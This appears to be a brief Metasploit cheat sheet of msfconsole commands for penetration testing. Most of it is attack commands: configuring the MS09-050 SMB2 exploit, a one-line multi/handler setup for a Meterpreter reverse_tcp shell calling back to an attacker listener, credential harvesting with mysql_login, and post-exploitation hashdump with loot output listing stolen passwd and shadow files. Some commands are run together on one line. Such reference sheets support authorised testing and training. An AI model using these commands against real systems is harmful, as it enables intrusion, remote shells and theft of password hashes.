# Basic Usage

```bash
#Saving global variables (to type less)
msf > setg LHOST 192.168.1.101msf > setg RHOSTS 192.168.1.0/24msf > setg RHOST 192.168.1.136
msf > save


#comands usually used for configuring a module to run
msf exploit(ms09_050_smb2_negotiate_func_index) > show targets
msf exploit(ms09_050_smb2_negotiate_func_index) > show payloads
msf exploit(ms09_050_smb2_negotiate_func_index) > show options
msf exploit(ms09_050_smb2_negotiate_func_index) > show advanced
msf exploit(ms09_050_smb2_negotiate_func_index) > show evasion


#Module info
msf > info exploit/windows/smb/ms09_050_smb2_negotiate_func_index


#run msfconsole and set payload in 1 line
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.101; set LPORT 8080; run; exit -y"


#CSV Export
msf > services -s http -c port 172.16.194.134 -o /root/msfu/http.csv
msf > hosts -S Linux -o /root/msfu/linux.csv
msf > cat /root/msfu/linux.csv
address,mac,name,os_name,os_flavor,os_sp,purpose,info,comments"172.16.194.172","00:0C:29:D1:62:80","","Linux","Debian","","server","",""
msf > cat /root/msfu/http.csv


#using workspace
msf > db_status 
msf > workspace
msf > workspace msfu
msf > workspace -a MyNewWorkSpace
msf > workspace -h
msf > db_import /root/scanresults.nmap.xml
msf > hosts
msf > db_nmap -A 172.17.1.98
msf > hosts
msf >  db_export -h
msf > db_export -f xml /root/msfu/Exported.xml
msf > hosts -c address,os_flavor


#(Search for 'Linux')
msf > hosts -c address,os_flavor -S Linux


#(Search for nmap scans in db)
msf > services -h
msf > services -c name,info 172.16.194.134
msf > services -c name,info -S http
msf > services -c info,name -p 445
msf > services -c port,proto,state -p 70-81
msf > services -s http -c port 172.16.194.134


#Show found credentials
msf  auxiliary(mysql_login) > run
msf  auxiliary(mysql_login) > creds 




#Post exploitation - loot
msf  exploit(usermap_script) > exploit

#ctrl+z
msf  exploit(usermap_script) > use post/linux/gather/hashdump
msf  post(hashdump) > sessions -l
msf  post(hashdump) > show options
msf  post(hashdump) > set session 1
msf  post(hashdump) > run
msf  post(hashdump) > loot

#host            service  type          name                   content     info                            path
#----            -------  ----          ----                   -------     ----                            ----
#172.16.194.172           linux.hashes  unshadowed_passwd.pwd  text/plain  Linux Unshadowed Password File  /root/.msf4/loot/20120627193921_msfu_172.16.194.172_linux.hashes_264208.txt
#172.16.194.172           linux.passwd  passwd.tx              text/plain  Linux Passwd File               /root/.msf4/loot/20120627193921_msfu_172.16.194.172_linux.passwd_953644.txt
#172.16.194.172           linux.shadow  shadow.tx              text/plain  Linux Password Shadow File      /root/.msf4/loot/20120627193921_msfu_172.16.194.172_linux.shadow_492948.txt

```

